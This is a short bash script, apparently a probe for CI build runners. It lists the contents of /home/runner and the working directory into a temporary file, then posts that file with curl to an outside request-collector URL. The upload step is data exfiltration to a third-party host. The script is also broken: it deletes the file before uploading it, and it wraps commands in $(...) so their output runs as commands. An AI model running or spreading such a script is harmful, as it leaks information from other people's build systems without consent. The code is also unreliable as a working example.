#!/bin/bash

rm /tmp/file.txt

echo "STARTING..." > /tmp/file.txt

$(ls -la /home/runner) >> /tmp/file.txt
$(pwd) >> /tmp/file.txt
$(ls -la) >> /tmp/file.txt

echo "FINISHED..." >> /tmp/file.txt

rm /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/
